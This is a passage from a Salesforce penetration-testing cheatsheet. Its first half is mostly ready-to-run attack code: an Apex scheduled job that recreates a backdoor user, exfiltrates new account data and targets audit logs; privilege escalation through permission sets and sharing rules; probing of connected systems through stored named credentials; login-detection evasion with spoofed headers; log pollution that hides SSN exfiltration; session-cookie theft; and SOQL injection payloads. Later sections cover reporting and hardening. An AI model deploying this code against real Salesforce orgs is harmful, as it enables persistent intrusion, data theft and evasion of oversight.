// Apex scheduled job for persistence
global class BackdoorMaintenanceJob implements Schedulable {
    global void execute(SchedulableContext sc) {
        // Maintain backdoor access
        maintainBackdoorUser();
        
        // Periodic data collection
        collectSensitiveData();
        
        // Clean up traces
        cleanAuditLogs();
    }
    
    private void maintainBackdoorUser() {
        List<User> backdoorUsers = [SELECT Id FROM User WHERE Username = 'maintenance@company-domain.com'];
        if (backdoorUsers.isEmpty()) {
            // Recreate backdoor if detected and removed
            PersistenceManager.createBackdoorUser();
        }
    }
    
    private void collectSensitiveData() {
        // Periodic data collection logic
        List<Account> newAccounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE CreatedDate = LAST_N_DAYS:1];
        if (!newAccounts.isEmpty()) {
            // Exfiltrate new data
            HttpExfiltration.exfiltrateViaHttp();
        }
    }
    
    private void cleanAuditLogs() {
        // Attempt to clean audit trail evidence
        try {
            List<SetupAuditTrail> auditEntries = [SELECT Id FROM SetupAuditTrail WHERE CreatedBy.Username = 'maintenance@company-domain.com'];
            // Note: SetupAuditTrail records cannot be deleted, but this shows intent
        } catch (Exception e) {
            // Audit cleaning failed
        }
    }
}

// Schedule the job to run daily
System.schedule('Maintenance Job', '0 0 2 * * ?', new BackdoorMaintenanceJob());
```

**Impact**: Long-term unauthorized access, continued data compromise, persistent threat presence.

### 3. Lateral Movement

**Objective**: Techniques for expanding access within the Salesforce ecosystem.

**Permission Set Assignment for Privilege Escalation**:
```apex
public class LateralMovement {
    public static void escalatePrivileges(Id targetUserId) {
        // Find high-privilege permission sets
        List<PermissionSet> adminPermSets = [
            SELECT Id, Name 
            FROM PermissionSet 
            WHERE PermissionsModifyAllData = true 
               OR PermissionsViewAllData = true
        ];
        
        for (PermissionSet ps : adminPermSets) {
            try {
                PermissionSetAssignment psa = new PermissionSetAssignment(
                    PermissionSetId = ps.Id,
                    AssigneeId = targetUserId
                );
                insert psa;
                System.debug('Assigned permission set: ' + ps.Name);
            } catch (Exception e) {
                System.debug('Failed to assign: ' + ps.Name + ' - ' + e.getMessage());
            }
        }
    }
}
```

**Sharing Rule Manipulation**:
```apex
public class SharingManipulation {
    public static void createMaliciousSharing() {
        // Create overly permissive account sharing rule
        AccountSharingRule rule = new AccountSharingRule(
            Name = 'Emergency Access Rule',
            AccountAccessLevel = 'Edit',
            CaseAccessLevel = 'Edit',
            ContactAccessLevel = 'Edit',
            OpportunityAccessLevel = 'Edit',
            SharedToType = 'Role',
            SharedToId = 'ROLE_ID'  // Target role ID
        );
        
        try {
            insert rule;
            System.debug('Malicious sharing rule created');
        } catch (Exception e) {
            System.debug('Sharing rule creation failed: ' + e.getMessage());
        }
    }
}
```

**Cross-System Integration Exploitation**:
```apex
public class IntegrationExploit {
    @future(callout=true)
    public static void exploitConnectedSystems() {
        // Harvest credentials from named credentials
        List<NamedCredential> credentials = [SELECT DeveloperName, Endpoint FROM NamedCredential];
        
        for (NamedCredential cred : credentials) {
            try {
                HttpRequest req = new HttpRequest();
                req.setEndpoint('callout:' + cred.DeveloperName + '/api/admin/users');
                req.setMethod('GET');
                
                Http http = new Http();
                HttpResponse res = http.send(req);
                
                if (res.getStatusCode() == 200) {
                    // Successfully accessed connected system
                    System.debug('Connected system accessed: ' + cred.DeveloperName);
                    
                    // Attempt to extract data or escalate privileges in connected system
                    String responseBody = res.getBody();
                    // Process response for additional exploitation
                }
            } catch (Exception e) {
                System.debug('Connection failed: ' + cred.DeveloperName);
            }
        }
    }
}
```

**Impact**: Expanded unauthorized access, multi-system compromise, network lateral movement.

---

## Detection Evasion

### 1. Audit Trail Manipulation

**Objective**: Techniques for avoiding detection in security logs and audit trails.

**Login History Evasion**:
```python
def evasive_login_patterns(username, password):
    """Use varied login patterns to avoid detection"""
    import random
    import time
    
    # Vary user agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ]
    
    # Vary source IPs (if possible)
    proxy_ips = ['192.168.1.10', '10.0.0.5', '172.16.0.20']
    
    for i in range(5):
        headers = {
            'User-Agent': random.choice(user_agents),
            'X-Forwarded-For': random.choice(proxy_ips)
        }
        
        # Perform login with variation
        login_data = {'username': username, 'pw': password}
        response = requests.post(
            'https://instance.salesforce.com/login.jsp',
            data=login_data,
            headers=headers
        )
        
        # Random delay between attempts
        time.sleep(random.uniform(30, 300))  # 30 seconds to 5 minutes
```

**Setup Audit Trail Evasion**:
```apex
public class AuditEvasion {
    public static void performStealthyActions() {
        // Use anonymous blocks to reduce attribution
        Database.executeBatch(new StealthyBatch(), 1);
    }
    
    // Batch job to distribute actions across time
    public class StealthyBatch implements Database.Batchable<SObject> {
        public Database.QueryLocator start(Database.BatchableContext bc) {
            return Database.getQueryLocator('SELECT Id FROM Account LIMIT 1');
        }
        
        public void execute(Database.BatchableContext bc, List<Account> records) {
            // Perform malicious actions in small batches
            List<User> users = [SELECT Id, IsActive FROM User WHERE Profile.Name != 'System Administrator' LIMIT 5];
            
            for (User u : users) {
                // Make subtle privilege changes
                try {
                    // Assign temporary permission set
                    PermissionSetAssignment psa = new PermissionSetAssignment(
                        PermissionSetId = 'HIDDEN_PERMISSION_SET_ID',
                        AssigneeId = u.Id,
                        ExpirationDate = Date.today().addDays(1)  // Temporary assignment
                    );
                    insert psa;
                } catch (Exception e) {
                    // Fail silently
                }
            }
        }
        
        public void finish(Database.BatchableContext bc) {
            // Clean up after batch completion
        }
    }
}
```

**Debug Log Pollution**:
```apex
public class LogPollution {
    public static void polluteLogs() {
        // Generate high volume of legitimate-looking debug logs
        for (Integer i = 0; i < 1000; i++) {
            System.debug('Processing record batch: ' + i);
            System.debug('Validation check passed for item: ' + i);
            System.debug('Business rule applied successfully: ' + i);
        }
        
        // Hide malicious activity within noise
        List<Contact> contacts = [SELECT Id, Name, SSN__c FROM Contact LIMIT 100];
        System.debug('Processing contact records: ' + contacts.size());
        
        // Actual malicious activity disguised as routine processing
        for (Contact c : contacts) {
            if (c.SSN__c != null) {
                // Exfiltrate data disguised as routine logging
                System.debug('Contact processed: ID=' + c.Id + ' Data=' + c.SSN__c);
            }
        }
    }
}
```

**Impact**: Reduced forensic evidence, investigation hindrance, detection avoidance.

### 2. Legitimate Tool Abuse

**Objective**: Using authorized tools and features for malicious purposes to avoid detection.

**Data Loader Abuse**:
```python
def abuse_data_loader():
    """Use Data Loader for bulk data extraction"""
    # Configure Data Loader for extraction
    config = {
        'sfdc.endpoint': 'https://instance.salesforce.com',
        'sfdc.username': 'legitimate_user@company.com',
        'sfdc.password': 'password_with_token',
        'process.operation': 'extract',
        'process.mappingFile': 'contact_mapping.sdl',
        'dataAccess.type': 'csvRead',
        'dataAccess.name': 'contacts_extract.csv'
    }
    
    # Extract appears as routine data maintenance
    print("Performing routine data synchronization...")
    # Data Loader extraction process
```

**Workbench Exploitation**:
```javascript
// Use Workbench for SOQL injection testing disguised as data analysis
const malicious_queries = [
    "SELECT Id, Name FROM Account WHERE Name = 'x' UNION SELECT Id, Password__c FROM User--",
    "SELECT Id FROM Contact WHERE Email = 'test' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') > 0--"
];

// Execute via Workbench query interface
malicious_queries.forEach(query => {
    console.log("Executing data analysis query:", query);
    // Execute through Workbench UI
});
```

**Developer Console Abuse**:
```apex
// Execute malicious code via Developer Console anonymous blocks
// Appears as routine development/debugging activity

// Data exfiltration disguised as debugging
List<Account> accounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE AnnualRevenue > 1000000];
System.debug('High value accounts analysis:');
for (Account a : accounts) {
    System.debug('Account: ' + a.Name + ' Revenue: ' + a.AnnualRevenue);
    // Data captured in debug logs for extraction
}

// Privilege escalation disguised as testing
User testUser = [SELECT Id FROM User WHERE Username = 'target@company.com'];
PermissionSetAssignment psa = new PermissionSetAssignment(
    PermissionSetId = 'HIGH_PRIVILEGE_PERMISSION_SET_ID',
    AssigneeId = testUser.Id
);
insert psa;
System.debug('Test permission assignment completed');
```

**Browser Extension Abuse**:
```javascript
// Use Salesforce Inspector for session manipulation
// Disguised as routine administrative tasks

// Extract session information
const sessionId = document.cookie.match(/sid_Client=([^;]+)/)[1];
console.log("Current session for backup:", sessionId);

// Manipulate user records through Inspector
const userData = {
    Id: '005XX000001b0Qw',
    IsActive: false,
    ProfileId: 'STANDARD_PROFILE_ID'
};

// Use Inspector's data manipulation features
console.log("Updating user configuration:", userData);
```

**Impact**: Detection avoidance through legitimate tool usage, plausible deniability.

---

## Reporting & Evidence Collection

### 1. Critical Findings Documentation

**Objective**: Systematically document security vulnerabilities with evidence and impact assessment.

**Finding Template Structure**:
```markdown
## Finding: [Vulnerability Name]

### Executive Summary
Brief description of the vulnerability and its business impact.

### Technical Details
**Vulnerability Type**: [OWASP Category]
**CVSS Score**: [Score/10]
**Risk Level**: [Critical/High/Medium/Low]

### Root Cause Analysis
Detailed explanation of the underlying security flaw.

### Proof of Concept
Step-by-step reproduction instructions with screenshots/code.

### Evidence
- Screenshots of vulnerable configurations
- Code snippets demonstrating the flaw
- SOQL query results showing data exposure
- API response samples

### Business Impact
- Data confidentiality impact
- Integrity concerns
- Availability risks
- Compliance implications
- Potential financial impact

### Remediation Steps
1. Immediate actions (workarounds)
2. Short-term fixes
3. Long-term security improvements
4. Validation steps

### References
- Salesforce security documentation
- Industry best practices
- Compliance requirements
```

**Evidence Collection Script**:
```python
def collect_security_evidence():
    """Automated evidence collection for security findings"""
    import json
    import datetime
    
    evidence = {
        'timestamp': datetime.datetime.now().isoformat(),
        'org_info': {},
        'user_permissions': {},
        'security_settings': {},
        'vulnerable_code': {},
        'data_exposure': {}
    }
    
    # Collect organizational information
    evidence['org_info'] = {
        'org_id': 'REDACTED_ORG_ID',
        'instance': 'na123',
        'edition': 'Enterprise',
        'sandbox': False
    }
    
    # Document permission vulnerabilities
    evidence['user_permissions'] = {
        'over_privileged_users': 15,
        'modify_all_data_users': 8,
        'view_all_data_users': 12,
        'guest_user_permissions': ['Read Contact', 'Read Account']
    }
    
    # Security configuration issues
    evidence['security_settings'] = {
        'password_policy': {
            'min_length': 8,  # Below recommended 12
            'complexity': 'Low',
            'lockout_threshold': 10  # Above recommended 5
        },
        'session_security': {
            'ip_locking': False,
            'timeout': 480,  # 8 hours, above recommended 2
            'concurrent_sessions': True
        }
    }
    
    return evidence

def generate_executive_summary(findings):
    """Generate executive summary of security assessment"""
    summary = {
        'critical_findings': len([f for f in findings if f.risk == 'Critical']),
        'high_findings': len([f for f in findings if f.risk == 'High']),
        'medium_findings': len([f for f in findings if f.risk == 'Medium']),
        'low_findings': len([f for f in findings if f.risk == 'Low']),
        'total_findings': len(findings),
        'overall_risk': 'High',  # Based on critical/high findings
        'key_recommendations': [
            'Implement MFA for all users',
            'Review and restrict administrative permissions',
            'Enable Platform Encryption for sensitive fields',
            'Strengthen password policies',
            'Implement IP restrictions'
        ]
    }
    return summary
```

### 2. Compliance Mapping

**Objective**: Map identified vulnerabilities to relevant compliance frameworks.

**Framework Mapping**:
```python
def map_findings_to_compliance():
    """Map security findings to compliance frameworks"""
    
    compliance_mapping = {
        'SOX': {
            'applicable_controls': ['Access Controls', 'Change Management', 'Data Integrity'],
            'violated_controls': ['SOX-ITG-01', 'SOX-ITG-03'],
            'findings': ['Over-privileged users', 'Weak password policies']
        },
        'PCI_DSS': {
            'applicable_controls': ['Access Control', 'Encryption', 'Network Security'],
            'violated_controls': ['PCI-DSS-7', 'PCI-DSS-8'],
            'findings': ['Unencrypted credit card fields', 'Weak authentication']
        },
        'GDPR': {
            'applicable_controls': ['Data Protection', 'Access Rights', 'Data Breach'],
            'violated_controls': ['GDPR-Art25', 'GDPR-Art32'],
            'findings': ['PII exposure', 'Inadequate access controls']
        },
        'HIPAA': {
            'applicable_controls': ['Administrative Safeguards', 'Physical Safeguards', 'Technical Safeguards'],
            'violated_controls': ['HIPAA-164.308', 'HIPAA-164.312'],
            'findings': ['Medical data exposure', 'Missing encryption']
        },
        'ISO_27001': {
            'applicable_controls': ['A.9 Access Control', 'A.10 Cryptography', 'A.12 Operations Security'],
            'violated_controls': ['A.9.1.1', 'A.9.2.1', 'A.10.1.1'],
            'findings': ['Access control weaknesses', 'Encryption gaps']
        }
    }
    
    return compliance_mapping
```

### 3. Risk Assessment Matrix

**Objective**: Quantify and prioritize security risks for business decision-making.

**Risk Calculation Framework**:
```python
def calculate_risk_score(vulnerability):
    """Calculate quantitative risk score"""
    
    # Impact factors (1-5 scale)
    impact_factors = {
        'data_sensitivity': vulnerability.data_sensitivity,  # 1-5
        'user_count_affected': min(vulnerability.affected_users / 100, 5),  # Scale to 1-5
        'business_criticality': vulnerability.business_impact,  # 1-5
        'compliance_impact': vulnerability.compliance_risk  # 1-5
    }
    
    # Likelihood factors (1-5 scale)
    likelihood_factors = {
        'exploitability': vulnerability.exploitability,  # 1-5
        'attack_vector': vulnerability.attack_complexity,  # 1-5
        'authentication_required': 5 - vulnerability.auth_bypass,  # Inverse scale
        'user_interaction': 5 - vulnerability.user_interaction  # Inverse scale
    }
    
    # Calculate weighted scores
    impact_score = sum(impact_factors.values()) / len(impact_factors)
    likelihood_score = sum(likelihood_factors.values()) / len(likelihood_factors)
    
    # Overall risk score (1-25 scale)
    risk_score = impact_score * likelihood_score
    
    # Risk categorization
    if risk_score >= 20:
        risk_level = 'Critical'
    elif risk_score >= 15:
        risk_level = 'High'
    elif risk_score >= 10:
        risk_level = 'Medium'
    elif risk_score >= 5:
        risk_level = 'Low'
    else:
        risk_level = 'Informational'
    
    return {
        'score': risk_score,
        'level': risk_level,
        'impact': impact_score,
        'likelihood': likelihood_score
    }

def prioritize_remediation(findings):
    """Prioritize remediation based on risk scores and business factors"""
    
    prioritized_findings = sorted(findings, key=lambda x: (
        x.risk_score,
        x.ease_of_exploitation,
        x.affected_user_count
    ), reverse=True)
    
    remediation_timeline = {
        'immediate': [],  # Critical findings, fix within 24-48 hours
        'short_term': [],  # High findings, fix within 1-2 weeks
        'medium_term': [],  # Medium findings, fix within 1-3 months
        'long_term': []  # Low findings, fix within next release cycle
    }
    
    for finding in prioritized_findings:
        if finding.risk_level == 'Critical':
            remediation_timeline['immediate'].append(finding)
        elif finding.risk_level == 'High':
            remediation_timeline['short_term'].append(finding)
        elif finding.risk_level == 'Medium':
            remediation_timeline['medium_term'].append(finding)
        else:
            remediation_timeline['long_term'].append(finding)
    
    return remediation_timeline
```

---

## Remediation & Hardening Recommendations

### 1. Immediate Security Controls

**Critical Actions (24-48 hours)**:

1. **Enable MFA for All Users**:
   - Navigate to Setup → Single Sign-On Settings → Multi-Factor Authentication
   - Enable "Multi-factor authentication for all direct UI logins"
   - Require MFA for high-privilege profiles

2. **Review Administrative Permissions**:
   ```sql
   -- Audit and restrict users with dangerous permissions
   SELECT Id, Username, Profile.Name 
   FROM User 
   WHERE Profile.PermissionsModifyAllData = true 
      OR Profile.PermissionsViewAllData = true
   ```

3. **Enable Session Security**:
   - Setup → Security → Session Settings
   - Enable "Lock sessions to IP address"
   - Set session timeout to 2 hours maximum
   - Enable "High assurance session required"

4. **Implement IP Restrictions**:
   - Setup → Security → Network Access
   - Configure IP ranges for admin profiles
   - Enable "Enforce IP restrictions" for sensitive profiles

### 2. Short-Term Security Improvements (1-2 weeks)

1. **Field-Level Security Implementation**:
   ```apex
   // Implement proper FLS checks in all Apex code
   public with sharing class SecureController {
       public List<Contact> getContacts() {
           if (!Schema.sObjectType.Contact.fields.SSN__c.isAccessible()) {
               throw new AuraHandledException('Access Denied');
           }
           return [SELECT Id, Name, SSN__c FROM Contact WITH SECURITY_ENFORCED];
       }
   }
   ```

2. **Platform Encryption Deployment**:
   - Setup → Security → Platform Encryption
   - Enable encryption for sensitive fields (SSN, Credit Card, etc.)
   - Implement proper key management

3. **Sharing Model Hardening**:
   - Review and restrict Organization-Wide Defaults
   - Audit sharing rules for over-permissive access
   - Implement role hierarchy properly

### 3. Long-Term Security Strategy (1-3 months)

1. **Security Monitoring Implementation**:
   ```sql
   -- Create monitoring queries for suspicious activity
   SELECT Id, UserId, User.Username, LoginTime, SourceIp, Status
   FROM LoginHistory 
   WHERE LoginTime = LAST_N_DAYS:1 
     AND Status IN ('Failed', 'Invalid Password')
   ORDER BY LoginTime DESC
   ```

2. **Code Security Standards**:
   - Implement mandatory code reviews
   - Deploy SAST tools in CI/CD pipeline
   - Enforce secure coding standards

3. **Incident Response Procedures**:
   - Develop security incident playbooks
   - Implement automated threat detection
   - Create user security training programs

---

## Conclusion

This comprehensive Salesforce pentesting cheatsheet provides expert-level guidance for security professionals conducting authorized security assessments. The methodologies, queries, and techniques documented here represent real-world attack vectors and should be used responsibly within the bounds of proper authorization.

Key takeaways for effective Salesforce security testing:

1. **Focus on Custom Code**: Standard Salesforce is generally secure; vulnerabilities primarily exist in custom development
2. **Understand the Platform**: Salesforce's unique security model requires specialized knowledge
3. **Test Systematically**: Follow a methodical approach covering all attack surfaces
4. **Document Thoroughly**: Provide clear evidence and remediation guidance
5. **Think Like an Attacker**: Chain vulnerabilities for maximum impact assessment

Remember: The goal is not just to break things, but to help organizations build more secure Salesforce implementations. Use this knowledge responsibly to strengthen cloud security postures and protect sensitive business data.

---

*This cheatsheet represents a compilation of expert knowledge and should be used only for authorized security assessments. Always ensure proper written authorization before conducting any security testing activities.*